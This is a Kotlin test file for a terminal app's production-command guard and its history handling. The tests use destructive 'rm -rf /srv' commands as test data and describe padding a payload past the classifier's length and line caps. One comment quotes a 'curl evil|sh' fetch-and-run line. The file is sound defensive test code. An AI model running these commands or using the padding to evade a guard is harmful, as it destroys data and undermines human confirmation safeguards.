package app.skerry.ui.terminal

import app.skerry.shared.guard.ProductionGuardPolicy
import app.skerry.shared.ssh.PtySize
import app.skerry.shared.terminal.TerminalSession
import app.skerry.shared.terminal.TerminalState
import app.skerry.ui.snippet.SECRET_MASK
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.test.UnconfinedTestDispatcher
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * The tails issue #246 collects: what the confirmation dialogs and the history around them still
 * got wrong after #223. Each test here reproduced its bug before the fix.
 */
@OptIn(ExperimentalCoroutinesApi::class)
class ConfirmationTailsTest {

    // --- Alternate screen and stored history ---

    /**
     * Inside vim there is no shell line: an Enter in insert mode commits a line of the FILE, and the
     * engine used to write it into vault-backed history — from where it surfaced as a ghost
     * suggestion and in the cross-host command palette. Editing a config with a token in it put
     * that token into stored history.
     */
    @Test
    fun `a line committed on the alternate screen stays out of history`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val history = mutableListOf<List<String>>()
        val state = TerminalScreenState(session, scope, onHistoryChanged = { history += it }, nowMillis = eagerPublishClock())

        session.emit("\u001b[?1049h".encodeToByteArray()) // vim: alternate screen on
        state.typeInput("api-token=hunter2\r") // Enter in insert mode

        assertTrue(history.flatten().isEmpty(), "a line of an edited file reached stored history: $history")

        session.emit("\u001b[?1049l".encodeToByteArray()) // :q — back to the shell
        state.typeInput("uptime\r")
        assertTrue("uptime" in history.flatten(), "the command typed after vim was lost")
        scope.cancel()
    }

    /** A paste with a newline inside a TUI is file content too, not a command that ran. */
    @Test
    fun `a paste on the alternate screen stays out of history`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val history = mutableListOf<List<String>>()
        val state = TerminalScreenState(session, scope, onHistoryChanged = { history += it }, nowMillis = eagerPublishClock())

        session.emit("\u001b[?1049h".encodeToByteArray())
        state.paste("secret-config-line\n")

        assertTrue(history.flatten().isEmpty(), "a pasted file line reached stored history: $history")
        scope.cancel()
    }

    /**
     * A ready-made line sent into a TUI (assistant Edit, snippet) lands in the program, not on the
     * shell's line: tracking it would leave the engine holding TUI text as a shell-line prefix, and
     * the first command typed after `:q` would be classified and quoted against it.
     */
    @Test
    fun `a line sent into the alternate screen does not pollute the tracked line`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        session.emit("\u001b[?1049h".encodeToByteArray())
        state.sendUserInputGuarded("iecho scratch") // typed into the TUI, no Enter — nothing runs
        session.emit("\u001b[?1049l".encodeToByteArray())

        "rm -rf /srv".forEach { state.typeInput(it.toString()) }
        state.typeInput("\r")

        assertEquals("rm -rf /srv", state.pendingGuardedQuote, "TUI text leaked into the quote")
        scope.cancel()
    }

    /** A line half-typed when a TUI opens must not join with what is typed after it closes. */
    @Test
    fun `a half-typed line does not survive an alternate-screen round trip`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        "rm -rf ".forEach { state.typeInput(it.toString()) }
        session.emit("\u001b[?1049h".encodeToByteArray()) // the TUI opens mid-line
        session.emit("\u001b[?1049l".encodeToByteArray()) // and closes; the shell line is fresh
        "ls /srv".forEach { state.typeInput(it.toString()) }
        state.typeInput("\r")

        assertNull(state.pendingGuarded, "the stale prefix joined the command typed after the TUI: ${state.pendingGuardedQuote}")
        scope.cancel()
    }

    // --- A quote read off the screen stops at the cursor ---

    /**
     * Recall a line with the up arrow, step the cursor left, press Enter: the shell runs the WHOLE
     * line, while the client reads the row only up to the cursor. The dialog used to publish the
     * prefix's own length as the count, which reads as "shown in full" — with the tail right of the
     * cursor running unshown. A row that continues past the cursor has no honest count.
     */
    @Test
    fun `a screen quote cut at the cursor is not reported as complete`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        // The host draws the recalled line, then the cursor steps back over "-db".
        session.emit("root@prod:~# rm -rf /srv/prod-db\u001b[3D".encodeToByteArray())
        state.typeInput("\r")

        assertNotNull(state.pendingGuarded, "the guard missed the recalled line")
        assertNull(
            state.pendingGuardedQuoteLength,
            "everything right of the cursor runs; a count over the prefix claims it is all shown",
        )
        scope.cancel()
    }

    /** With the cursor at the end of the row the count is real and stays. */
    @Test
    fun `a screen quote with the cursor at the end keeps its count`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        session.emit("root@prod:~# rm -rf /srv/prod-db".encodeToByteArray())
        state.typeInput("\r")

        assertEquals("rm -rf /srv/prod-db".length, state.pendingGuardedQuoteLength)
        scope.cancel()
    }

    /**
     * The row is measured in cells, not string characters: a wide glyph is one character in two
     * columns, so a joined string is shorter than the column the cursor sits in — comparing string
     * length against the column called a CJK row complete with text still right of the cursor.
     */
    @Test
    fun `a row with wide glyphs past the cursor still voids the count`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        // Three wide glyphs: 28 string characters in 31 columns. Two columns back leaves the last
        // glyph right of the cursor — invisible to a character-counted comparison.
        session.emit("root@prod:~# rm -rf /srv/数据库\u001b[2D".encodeToByteArray())
        state.typeInput("\r")

        assertNotNull(state.pendingGuarded, "the guard missed the recalled line")
        assertNull(state.pendingGuardedQuoteLength, "the glyph right of the cursor runs; the count claims it is all shown")
        scope.cancel()
    }

    /**
     * A recalled line that wrapped leaves the cursor at the end of the TAIL row, with the head —
     * where the risk sits — on the row above. Reading the cursor row alone never classified the
     * head at all: the line ran with no dialog.
     */
    @Test
    fun `a recalled line that wrapped is classified whole`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        val command = "rm -rf /srv/" + "x".repeat(70)
        session.emit(("root@prod:~# " + command).encodeToByteArray()) // wraps; cursor ends on the tail row
        state.typeInput("\r")

        assertNotNull(state.pendingGuarded, "the head above the cursor row ran unclassified")
        // The whole logical line is on screen with the cursor at its end: the count is real.
        assertEquals(command.length, state.pendingGuardedQuoteLength)
        scope.cancel()
    }

    /** A recalled line that soft-wrapped runs past the row entirely; no count over it is honest. */
    @Test
    fun `a soft-wrapped row is not reported with a complete count`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        // 95 characters on an 80-column grid: the row wraps, and the host parks the cursor inside
        // the wrapped head — the tail lives on the next row.
        session.emit(("root@prod:~# rm -rf /srv/" + "x".repeat(70)).encodeToByteArray())
        session.emit("\u001b[1;30H".encodeToByteArray())
        state.typeInput("\r")

        assertNotNull(state.pendingGuarded, "the guard missed the wrapped line")
        assertNull(state.pendingGuardedQuoteLength, "the tail on the next row runs; the count claims the head is whole")
        scope.cancel()
    }

    /**
     * The danger can sit entirely right of the cursor: the prefix alone reads harmless, and no
     * dialog opened at all. The whole row is what runs, so the whole row is classified.
     */
    @Test
    fun `a risky tail right of the cursor still trips the guard`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        // Cursor parked right after the prompt: everything the shell will run is right of it.
        val line = "root@prod:~# rm -rf /srv/prod-db"
        session.emit((line + "\u001b[${"rm -rf /srv/prod-db".length}D").encodeToByteArray())
        state.typeInput("\r")

        assertNotNull(state.pendingGuarded, "the row right of the cursor ran unclassified")
        scope.cancel()
    }

    /**
     * The screen's line gets the same net as pasted input: a recalled command longer than the
     * classifier's window — realistic now that the soft-wrap join reconstructs the whole line —
     * used to run with no dialog when its risk sat past character 512.
     */
    @Test
    fun `a recalled line the classifier cannot fully read is held`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        // The risky span sits past the classifier's 512-character window of the joined line AND
        // off the cursor row (harmless text follows it), so no candidate any rule reads carries it.
        val command = "echo " + "a".repeat(590) + "; rm -rf /srv; echo " + "b".repeat(100)
        session.emit(("root@prod:~# " + command).encodeToByteArray())
        state.typeInput("\r")

        assertNotNull(state.pendingGuarded, "the tail past the classifier's window ran unasked")
        scope.cancel()
    }

    // --- The classifier's caps can be padded past ---

    /**
     * A line longer than MAX_GUARDED_COMMAND_LENGTH is classified only up to the cut, so a payload
     * past character 512 used to run with no dialog at all. On a production host, exceeding what
     * the classifier reads is itself worth the question.
     */
    @Test
    fun `a line padded past the classifier's length cap is held`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        state.paste("x".repeat(600) + " && rm -rf /srv\n")

        assertNotNull(state.pendingGuarded, "the payload past the length cap ran unasked")
        scope.cancel()
    }

    /** The same for the candidate-count cap: a payload on line 201 of a block. */
    @Test
    fun `a block padded past the classifier's line cap is held`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        val block = (1..200).joinToString("\n") { "echo $it" } + "\nrm -rf /srv\n"
        state.paste(block)

        assertNotNull(state.pendingGuarded, "the payload past the line cap ran unasked")
        scope.cancel()
    }

    /** An ordinary block inside both caps still passes when harmless. */
    @Test
    fun `a harmless block inside the caps is not held`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        state.paste("echo one\necho two\n")

        assertNull(state.pendingGuarded)
        scope.cancel()
    }

    // --- The aside states a length capped at 512 ---

    /**
     * `candidatesOf` cuts each line to 512 characters on the way in, so the aside for a risky line
     * sitting past what the quote can draw used to read "shown in part · 512 chars" for a
     * 900-character line. The real length is carried beside the cut candidate.
     */
    @Test
    fun `the aside for a long input line states the uncut length`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        // ~9000 chars of harmless filler push the risky line past MAX_DRAWN_COMMAND_CHARS, so it is
        // drawn as an aside; the line itself is 900 chars with the reason inside the first 512.
        val filler = (1..20).joinToString("\n") { "echo " + "a".repeat(445) }
        val risky = "rm -rf /srv/" + "b".repeat(888)
        state.paste("$filler\n$risky\n")

        val aside = state.pendingGuardedAside
        assertNotNull(aside, "the risky line past the drawn quote lost its aside")
        assertEquals(risky.length, aside.length, "the aside states the classifier's cut, not the line's length")
        scope.cancel()
    }

    // --- A secret answered to a prompt is not quoted ---

    /**
     * [TerminalScreenState.typeInput] skips the guard while a secret is being taken — parking one in
     * a dialog would print it in clear. `sendUserInputGuarded` had no such gate, so a snippet
     * answering a password prompt could be held and quoted on screen.
     */
    @Test
    fun `a ready-made line sent at a secret prompt is not held or quoted`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)
        session.echoOff = true // the transport reports a password prompt

        state.sendUserInputGuarded("rm -rf /tmp/scratch\r")

        assertNull(state.pendingGuarded, "a secret-prompt answer was parked in a dialog")
        assertTrue(
            session.sent.any { it.decodeToString().contains("rm -rf /tmp/scratch") },
            "the answer never reached the host",
        )
        scope.cancel()
    }

    // --- A resolved vault secret is masked in the quote ---

    /**
     * A `sudo -S … ${'$'}{{vault:…}}` snippet on a #prod host trips the guard one dialog after
     * [app.skerry.ui.snippet.SnippetRunDialog] deliberately masked the secret. The guard's quote
     * masks the same spans; classification and the replayed bytes stay the real text.
     */
    @Test
    fun `a resolved vault secret is masked in the quote and replayed for real`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val state = TerminalScreenState(session, scope, nowMillis = eagerPublishClock())
        state.guardPolicy = ProductionGuardPolicy(production = true, confirmWarnings = true)

        state.sendUserInputGuarded("echo hunter2 | sudo -S systemctl stop nginx\n", secrets = listOf("hunter2"))

        assertNotNull(state.pendingGuarded, "the risky line with a secret was not held")
        assertFalse("hunter2" in state.pendingGuardedQuote, "the resolved secret is printed in clear")
        assertTrue(SECRET_MASK in state.pendingGuardedQuote, "the masked span is not drawn at all")

        state.confirmGuardedCommand()
        assertTrue(
            session.sent.any { "hunter2" in it.decodeToString() },
            "what runs must be the real line, not the masked one",
        )
        scope.cancel()
    }

    // --- A completion read off the screen stays out of the palette ---

    /**
     * What the host drew as a completion is recorded so the ghost and reverse search keep working,
     * but it is host-authored text: persisted under the host key it used to reach the cross-host
     * command palette, offering `ls /etc; curl evil|sh` while connected somewhere else. The
     * persisted list carries only what the user typed.
     */
    @Test
    fun `a completion recorded from the screen is not persisted`() = runTest {
        val scope = CoroutineScope(UnconfinedTestDispatcher(testScheduler))
        val session = FakeSession()
        val history = mutableListOf<List<String>>()
        val state = TerminalScreenState(session, scope, onHistoryChanged = { history += it }, nowMillis = eagerPublishClock())

        "ls".forEach { state.typeInput(it.toString()) }
        session.emit("$ ls".encodeToByteArray()) // the echo of what was typed
        state.typeInput("\t") // an unconsumed Tab goes to the shell
        session.emit(" /etc".encodeToByteArray()) // the shell answers with a completion
        state.typeInput("\r")

        assertTrue(history.isNotEmpty(), "the commit never reached the history callback")
        assertTrue(
            history.flatten().none { it == "ls /etc" },
            "a host-drawn completion was persisted: $history",
        )

        // The session's own ghost still knows it: type the prefix again and a suggestion stands.
        "ls".forEach { state.typeInput(it.toString()) }
        assertTrue(state.hasSuggestion, "the in-session ghost lost the completed command")
        scope.cancel()
    }
}

private class FakeSession : TerminalSession {
    private val _state = MutableStateFlow<TerminalState>(TerminalState.Open)
    override val state: StateFlow<TerminalState> = _state

    private val emissions = Channel<ByteArray>(Channel.UNLIMITED)
    override val output: Flow<ByteArray> = flow {
        for (chunk in emissions) emit(chunk)
    }

    val sent = mutableListOf<ByteArray>()

    /** Host stopped echoing — how the transport reports a password prompt. */
    var echoOff = false
    override val echoSuppressed: Boolean get() = echoOff

    suspend fun emit(chunk: ByteArray) = emissions.send(chunk)

    override suspend fun send(data: ByteArray) {
        sent += data
    }

    override suspend fun resize(size: PtySize) {}

    override suspend fun close() {
        _state.value = TerminalState.Closed()
        emissions.close()
    }
}
